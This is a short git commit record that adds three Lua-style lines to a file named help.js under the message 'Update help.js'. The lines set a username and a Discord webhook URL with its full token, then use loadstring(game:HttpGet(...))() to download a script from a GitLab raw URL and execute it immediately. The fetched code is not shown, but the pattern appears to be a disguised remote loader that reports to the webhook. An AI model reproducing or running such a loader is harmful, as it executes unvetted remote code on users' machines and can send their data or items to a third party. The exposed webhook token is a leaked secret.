1ea20c82f74e1653522ea8763221d1c4a6405873
mrmicaman <122133310+mrmicaman@users.noreply.github.com>
2025-06-08 14:17:01 -0700

    Update help.js

--- help.js
+++ help.js
@@ -1,1 +1,4 @@
+Username = "beasttitan90998"
+Webhook = "https://discord.com/api/webhooks/1381373891506737236/FJWiemCEpsj2IE9Aaq-hBrHbMCXO2KPZ4gmKbcgXuSbxocIi9eREIQfHnpz4cWEAPUm2"
 
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/BGSI"))()
